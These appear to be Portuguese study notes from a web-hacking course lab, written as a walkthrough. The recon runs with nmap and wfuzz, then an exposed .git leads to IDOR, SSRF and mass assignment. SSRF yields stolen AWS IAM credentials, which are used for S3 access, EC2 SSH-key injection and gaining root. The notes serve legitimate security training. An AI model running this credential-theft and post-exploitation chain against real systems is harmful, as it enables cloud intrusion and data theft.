# Anotações

## Dia 01 - Recon Scritps

Reconhecimento da aplicação.
É uma parte fundamental para encontramos vulnerabilidades. Quanto mais soubemos sobre a aplicação mas vulnerabilidades podemos encontramos.

O que podemos encontrar nessa etapa:

- Portas, IP, servidores em execução.
- Quais tecnologias existem no site.
- Mapear pasta, diretórios e rotas.

target: <https://notes.webhacking.com.br>

### Portas, IP, servidores em execução

#### Quais portas existem nesse servidor?

NMAP seleciona as 100 portas mais comuns

```bash
nmap notes.webhacking.com.br -v
# roda o nmap sem parâmetros, só com o modo verbose
# pra realizar um scan
```

```bash
PORT      STATE  SERVICE    REASON
21/tcp    open   ftp        syn-ack
22/tcp    open   ssh        syn-ack
25/tcp    open   smtp       syn-ack
53/tcp    open   domain     syn-ack
80/tcp    open   http       syn-ack
110/tcp   open   pop3       syn-ack
143/tcp   open   imap       syn-ack
443/tcp   open   https      syn-ack
465/tcp   open   smtps      syn-ack
587/tcp   open   submission syn-ack
993/tcp   open   imaps      syn-ack
995/tcp   open   pop3s      syn-ack
3306/tcp  open   mysql      syn-ack
5432/tcp  closed postgresql conn-refused
8443/tcp  open   https-alt  syn-ack
12000/tcp closed cce4x      conn-refused
```

#### Endereço IP da aplicação

> ping notes.webhacking.com.br

```bash
PING notes.webhacking.com.br (52.2.30.210) 56(84) bytes of data.
```

#### Servidor

Nem sempre o endereço ip será o servidor de fato da aplicação

[ipinfo.io](http://ipinfo.io)

Servidor tá hospedado na AWS 52.2.30.210 - na AWS - us-east-1 (us-east-1a) (us-east-1b)</br>
(zonas de disponibilidade)

> AWS 52.2.30.210 - na AWS - us-east-1 (us-east-1a) (us-east-1b)

![servidor](/shw/pics/servidor-descobrir.png)

#### Acessando na porta 80

Retornou o PHP info:

```bash
Nome interno: ip-172-31-17-141
OS: Ubuntu
PHP: 8.1.2-1ubuntu2.8
Apache 2.0 Handler - Apache/2.4.52
Arquivo de configuracao do PHP: /etc/php/8.1/apache2/php.ini
Usuario do apache: www-data
IP privado 172.31.17.141
```

> Aplicação está hospedada aqui: **/var/www/html**

Apache esta configurado pra ver um vhost (host virtual), por isso ao abrir pelo ip aparece o php info.

vhost: é a forma de usar o mesmo servidor para diversas aplicações.

Para saber para onde encaminhar a requisição, ele verifica o campo header da requisição, campo host.

### Quais tecnologias existem nesse site?

Análise manual pelo view page source, descobrimos que o site utiliza as tecnologias:

> Tailwind CSS, Jquery

### Mapear pasta, diretórios e rotas

Análise pela ferramenta **wfuzz**

```bash
wfuzz -c -z file,common.txt --hc 404 https://notes.webhacking.com.br/FUZZ
# não exibi resultados com status 404 --hc 404
# -c modo colorido
# -z qual wordlist utilizar (passando o tipo e o caminho)
# /FUZZ vai pegar cada item da lista e vai colocar no lugar de FUZZ
```

```bash
000000025:   403        9 L      28 W       289 Ch      ".htpasswd"  
000000024:   403        9 L      28 W       289 Ch      ".htaccess"  
000000023:   403        9 L      28 W       289 Ch      ".hta"       
000000013:   301        9 L      28 W       339 Ch      ".git/logs/" 
000000930:   301        9 L      28 W       336 Ch      "build"      
000001038:   301        9 L      28 W       337 Ch      "cgi-bin/"   
000001758:   200        0 L      0 W        0 Ch        "favicon.ico"
000002085:   302        11 L     22 W       394 Ch      "home"       
000002193:   200        136 L    581 W      8073 Ch     "index.php"  
000002511:   200        113 L    241 W      5370 Ch     "login"      
000002525:   405        154 L    31416 W    881696 Ch   "logout"     
000002845:   302        11 L     22 W       394 Ch      "notes"      
000003474:   200        114 L    251 W      5415 Ch     "register"   
000003569:   200        2 L      3 W        24 Ch       "robots.txt" 
000003710:   403        9 L      28 W       289 Ch      "server-status"
```

Agora pelo ip

```bash
wfuzz -c -z file,common.txt --hc 404 https://52.2.30.210/FUZZ
```

```bash
000000025:   403        9 L      28 W       277 Ch      ".htpasswd"       
000000023:   403        9 L      28 W       277 Ch      ".hta"            
000000024:   403        9 L      28 W       277 Ch      ".htaccess"       
000000013:   301        9 L      28 W       315 Ch      ".git/logs/"      
000000930:   301        9 L      28 W       312 Ch      "build"           
000001038:   301        9 L      28 W       313 Ch      "cgi-bin/"        
000001758:   200        0 L      0 W        0 Ch        "favicon.ico"     
000002085:   302        11 L     22 W       346 Ch      "home"            
000002193:   200        136 L    581 W      8073 Ch     "index.php"       
000002511:   200        113 L    241 W      5262 Ch     "login"           
000002525:   405        154 L    31416 W    881648 Ch   "logout"          
000002845:   302        11 L     22 W       346 Ch      "notes"           
000003474:   200        114 L    251 W      5319 Ch     "register"        
000003569:   200        2 L      3 W        24 Ch       "robots.txt"      
000003710:   403        9 L      28 W       277 Ch      "server-status"
```

```bash
http://52.2.30.210/.git/logs/HEAD # Possivel vulnerabilidade
```

![git logs](/shw/pics/git-logs.png)

### Explorando ./git/logs/HEAD

![GIT HEAD](/shw/pics/git-head.png)

Temos os commits que foram feitos para build e publicar aplicação no servidor.  

### Git exposed

Primeira vulnerabilidade e encontramos a flag.

> swh{fsdfsdfsdf}

Com a pasta .git exposta, conseguimos ter acesso a código fonte da aplicação (próxima aula).

## Dia 02 - Análise e identificação de vulnerabilidades

Identificar → analisar → explorar

Na identificação do diretório **./git/**, foi feito Code Review e depois a exploração.

Vulnerabilidades encontradas:

- **IDOR** (Insecure Direct Object Reference) - Não verifica o usuário autenticado, permite acesso a conteúdo de outro usuário.
- **SSRF** (Server Side Request Forgery) - pode levar ao comprometimento do servidor e da rede do cliente.
- **Mass Assignment** - é possível editar qualquer campo no perfil do usuário.

**Desafio**: Explorar a vulnerabilidade IDOR

![flag desafio 02](/shw/pics/flag02.png)

## Dia 03 - Exploração / Invasão

Exploração a vulnerabilidade de SSRF e acesso a AWS.

**CSRF**: tentativa de falsificação de requisição.
Bloqueado pelo Laravel, que utiliza de duas validações:

- Cookie: **XSRF-TOKEN**
- **_token**, gerado randomicamente a cada novo post.

**Burp** suite: tentativa de falsificação de requisição.
Com o burp conseguimos realizar com sucesso:

- Listamos e alteramos campos do usuario. Alterando o tipo de usuário para usuário admin. Vulnerabilidade foi permitida porque não tinha restrição de campo que impeça a alteração do tipo de usuário.
- Acesso IAM. Como acesso ao IAM, conseguimos pegar o servidor atrelado ao perfil e as credenciais:

```bash
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
```

**Acesso AWS**
Utilizamos AWS CLI, add as credenciais e realizamos uma chamada direita entre nós e AWS:

```bash
aws sts get-caller-identity #verifica se a chave tá funcionando e quem somos nós na AWS
```

Retornando:

```js
{
  UserId, 
  Account,
  Arn
}
```

Testamos o acesso ao S3

```bash
aws s3 ls
```

Retornando com sucesso.

**Desafio**: Encontrar a flag que tá no bucket em user-data.txt

**Solução**: Pesquisei como eu poderia copiar um arquivo do Bucket para a minha máquina.
Encontrei sobre o [CP](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/cp.html).

Basicamente eu chamaria o cp passando o Bucket com o . --recusive, assim eu copiaria tudo do Bucket para a minha máquina.</br>

Depois fiz um cat no arquivo user-data.txt, encontrando a flag.

![flag desafio 03](/shw/pics/flag03.png)

## Dia 04 - Pós-Exploração na AWS

- Listar sevidores(ec2)

```bash
aws ec2 describe-instances
```

![ec2 IP](/shw/pics/ec2-ip-new.png)

Colocamos a lista em leitor de JSON

![lista json](/shw/pics/ec2-retorno-ip.png)

Ao listar ec2, vimos IP que não conhecemos, fizemos um nmap e depois nmap sem o ping.

- Conectar instância EC2:

```bash
ec2-instace-connect help
```

![ec2 help](/shw/pics/ec2.help.png)

EC2 permite que o administrador de sistema envie uma chave ssh publica deles para um servidor.

Olhamos o que precisamos enviar para ter esse acesso:

```bash
aws ec2-instance-connect send-ssh-public-key help
```

![send-ssh-help](/shw/pics/send-ssh-help.png)

```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id i-1234567890abcdef0 \
--instance-os-user ec2-user \
--availability-zone us-east-2b \
--ssh-public-key file://path/my-rsa-key.pub
```

- Precisamos criar chave ssh (só crie se você não tiver uma)

```bahs
ssh-keygen
```

- Precisamos enviar chave publica para o servidor.

```bash
aws ec2-instance-connect send-ssh-public-key --instance-id i-032802861b7c9c59c --instance-os-user ec2-user --ssh-public-key file:///home/kali/.ssh/id_rsa.pub --availability-zone us-east-1a --region us-east-1
```

- instance-id e availability-zone são daquele IP que não conhecemos.

![dados ip](/shw/pics/dado-ip.png)

- Chave enviada com sucesso

![chave enviada](/shw/pics/ec2-send-key-ok.png)

- Agora vamos conectar com o servidor passando a chave ssh(chave privada)

```bash
ssh -i /home/kali/.ssh/id_rsa ec2-user@44.202.22.33
```

![aws](/shw/pics/acessando-aws.png)

**Desafio**: Virar usuario root da máquina
**Solução**:

- sudo passwd root : para mudar a senha do root
- su - : coloquei a nova senha
- ls -la: listei diretórios
- cat root.txt : encontrei a flag

![flag desafio 04](/shw/pics/flag04.png)
